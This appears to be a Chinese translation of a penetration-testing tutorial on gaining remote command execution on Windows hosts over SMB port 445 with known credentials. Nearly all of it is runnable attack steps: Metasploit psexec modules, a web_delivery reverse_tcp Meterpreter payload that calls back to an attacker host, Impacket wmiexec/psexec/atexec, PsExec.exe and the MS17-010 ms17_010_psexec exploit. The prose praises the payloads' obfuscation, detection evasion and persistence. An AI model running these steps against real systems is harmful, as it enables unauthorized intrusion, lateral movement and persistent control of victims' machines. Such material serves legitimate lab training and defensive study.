@@ -1,0 +1,214 @@
+**当你收集到了目标PC的用户名和密码之后，如何通过SMB端口445来与目标用户的设备建立连接呢？在这篇文章中，我们将帮助大家解开这个疑惑。**
+
+![1.png](https://image.3001.net/images/20180909/1536475108_5b94bfe4db876.png!small)
+
+## 参考资料
+
+《[如何通过SMB协议收集目标用户的用户名及密码](http://www.hackingarticles.in/5-ways-to-hack-smb-login-password/)》
+
+《[SMB协议介绍](http://www.hackingarticles.in/penetration-testing-in-smb-protocol-using-metasploit/)》
+
+## 研究设备
+
+目标主机：Windows Server 2008 R2
+
+攻击设备：Kali Linux
+
+## Microsoft Windows认证用户代码执行
+
+这个模块可以利用有效的管理员用户名和密码（或密码哈希）来执行一个任意Payload，这个模块跟SysInternals提供的“psexec”实用工具非常类似，而且该模块现在还可以在攻击完成之后自动清理痕迹。这款工具所创建的服务使用的是随机选择的用户名及相关描述。
+
+    
+    
+    msf > useexploit/windows/smb/psexec
+    
+    msf exploitwindows/smb/psexec) > set rhost 192.168.1.104
+    
+    msf exploit(windows/smb/psexec)> set smbuser administrator
+    
+    msf exploit(windows/smb/psexec)> set smbpass Ignite@123
+    
+    msf exploit(windows/smb/psexec)> exploit
+
+备注：
+
+    
+    
+    rhost–> 目标PC的IP地址
+    
+    smbuser–> 用户名
+    
+    smbpass–> 密码
+
+![2.png](https://image.3001.net/images/20180909/1536475140_5b94c0041e974.png!small)
+
+运行了上述命令之后，你将会拿到目标PC的meterpreter会话，接下来你就可以访问目标系统内的资源了。
+
+## Microsoft Windows认证Powershell命令执行
+
+这个模块可以使用有效的管理员用户名和密码来执行Powershell
+Payload，这里使用的技术跟“psexec”所使用的技术相似。Payload采用了base64编码，可以使用-encoded命令选项来从命令行界面执行。这种方法不会把Payload写入到目标设备的磁盘中，而且每次生成的Payload都是唯一的，这样更加不容易被基于签名的检测方案检测到。为了实现持久化感染，模块还提供了持久化选项并通过while循环来不断执行Payload。通过分析后我们还发现，PSH的执行还加入了延迟和混淆技术来躲避检测。为了避免弹出交互式进程通知（可能会引起用户的怀疑），psh
+Payload的大小减少了很多，并且封装在一个Powershell调用中（完全隐藏在窗口内）。
+
+msf > useexploit/windows/smb/psexec_psh
+
+msf exploit(windows/smb/psexec_psh) > setrhost 192.168.1.104
+
+msf exploit(windows/smb/psexec_psh)> set smbuser administrator
+
+msf exploit(windows/smb/psexec_psh)> set smbpass Ignite@123
+
+msf exploit(windows/smb/psexec_psh)> exploit
+
+运行了上述命令之后，你将会拿到目标PC的meterpreter会话，接下来…
+
+![3.png](https://image.3001.net/images/20180909/1536475165_5b94c01d64e47.png!small)
+
+## Microsoft Windows认证管理员实用工具
+
+这个模块可以使用有效的管理员用户名和密码来在一台或多台主机上执行任意命令，这个模块是非常有用的，因为它不需要向目标主机上传任何的代码。因此，在一个新的metasploit框架中，我们就可以使用Web发送模块来获取到恶意dll代码，并在目标主机上实现任意命令执行。
+
+    
+    
+    useexploit/multi/script/web_delivery
+    
+    msfexploit(multi/script/web_delivery) > set target 3
+    
+    msfexploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_tcp
+    
+    msfexploit(multi/script/web_delivery) > set lhost 192.168.1.106
+    
+    msfexploit(multi/script/web_delivery) > exploit
+
+![4.png](https://image.3001.net/images/20180909/1536475192_5b94c038c9d9a.png!small)
+
+复制上图中框起来的代码，这里面就是我们的恶意dll代码。
+
+    
+    
+    msf> use auxiliary/admin/smb/psexec_command
+    
+    msfauxiliary(admin/smb/psexec_command) > set rhosts 192.168.1.104
+    
+    msfauxiliary(admin/smb/psexec_command) > set smbuser administrator
+    
+    msfauxiliary(admin/smb/psexec_command) > set smbpass Ignite@123
+    
+    msfauxiliary(admin/smb/psexec_command) > set COMMAND [Paste above copied dllcode here]
+    
+    msfauxiliary(admin/smb/psexec_command) > exploit
+
+![5.png](https://image.3001.net/images/20180909/1536475211_5b94c04b79776.png!small)
+
+当我们运行了psexec auxiliary模块之后，我们将拿到拥有管理员权限的meterpreter会话。
+
+![6.png](https://image.3001.net/images/20180909/1536475219_5b94c053bb2b5.png!small)
+
+## SMB Impacket WMI Exec
+
+这个模块的使用方法跟psexec类似，但是它主要通过WMI来实现命令执行。
+
+    
+    
+    msf> use auxiliary/scanner/smb/impacket/wmiexec
+    
+    msfauxiliary(scanner/smb/impacket/wmiexec) > set rhosts 192.168.1.104
+    
+    msfauxiliary(scanner/smb/impacket/wmiexec) > set smbuser administrator
+    
+    msfauxiliary(scanner/smb/impacket/wmiexec) > set smbpass Ignite@123
+    
+    msfauxiliary(scanner/smb/impacket/wmiexec) > set COMMAND systeminfo
+    
+    msfauxiliary(scanner/smb/impacket/wmiexec) > exploit
+
+![7.png](https://image.3001.net/images/20180909/1536475243_5b94c06b9e5d3.png!small)
+
+## Impacket for Psexec.py
+
+Psexec.py可以在远程Windows系统中执行进程、拷贝文件、处理输出结果并回传流数据。它可以直接在完全交互式命令控制台中远程执行shell命令，而且不需要安装任何的客户端软件。现在，我们需要先从GitHub上安装Impacket工具。首先克隆git，然后安装Impacket，接下来运行psexec.py来与目标主机建立连接。
+
+    
+    
+    git clone <https://github.com/CoreSecurity/impacket.git>
+    
+    cd impacket/
+    
+    python setup.py install
+    
+    cd examples
+    
+    语句：./psexec.py [[domain/] username [: password] @] [Target IP Address]
+
+![8.png](https://image.3001.net/images/20180909/1536475286_5b94c09631c9a.png!small)
+
+## Impacket for Atexec.py
+
+这个样例能够通过任务计划服务（Task Scheduler）来在目标主机上实现命令执行，并返回命令执行后的输出结果。
+
+    
+    
+    ./atexec.pySERVER/Administrator:Ignite123@192.168.1.104 systeminfo
+
+语句：
+
+    
+    
+    /atexec.py [[domain/] username [: password] @] [Target IP Address][Command]
+
+你可以从下图中看到，跟服务器的远程连接已经建立成功，命令systeminfo将会在目标服务器上执行，输出结果将会直接返回到Kali的终端窗口。
+
+![9.png](https://image.3001.net/images/20180909/1536475317_5b94c0b5dc67d.png!small)
+
+## PsExec.exe
+
+PsExec.exe这款软件可以帮助我们访问目标网络内的其他主机，它能够以自动化的形式拿到远程PC的shell。
+
+PsExec.exe下载地址：【[点我下载](http://download.sysinternals.com/files/PSTools.zip)】
+
+下载后解压文件，然后在命令行窗口输入下列命令：
+
+    
+    
+    PsExec.exe\\192.168.1.104-u administrator -p Ignite@123 cmd
+
+备注：
+
+    
+    
+    192.168.1.104–> 远程主机的IP地址
+    
+    -u–> 指定用户名
+    
+    -p–> 指定密码
+    
+    cmd–> 输入命令
+
+![10.png](https://image.3001.net/images/20180909/1536475358_5b94c0dec1e5a.png!small)
+
+## MS17-010 EternalRomance SMB 远程代码执行
+
+测试设备：Windows 2007 旗舰版
+
+攻击设备：Kali Linux
+
+这个模块利用了SMB和MS17-010漏洞来实现数据的任意写入，并最终重写目标会话的连接信息，然后将其转换为管理员会话。
+
+    
+    
+    msf> use exploit/windows/smb/ms17_010_psexec
+    
+    msfexploit(windows/smb/ms17_010_psexec) > set rhost 192.168.1.105
+    
+    msfexploit(windows/smb/ms17_010_psexec) > set smbuser raj
+    
+    msfexploit(windows/smb/ms17_010_psexec) > set smbpass 123
+    
+    msfexploit(windows/smb/ms17_010_psexec) > exploit
+
+![11.png](https://image.3001.net/images/20180909/1536475386_5b94c0fa9056a.png!small)
+
+最后，祝大家Happy Hacking！
+
+ ***参考来源：[hackingarticles](http://www.hackingarticles.in/multiple-ways-to-connect-remote-pc-using-smb-port/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**
+
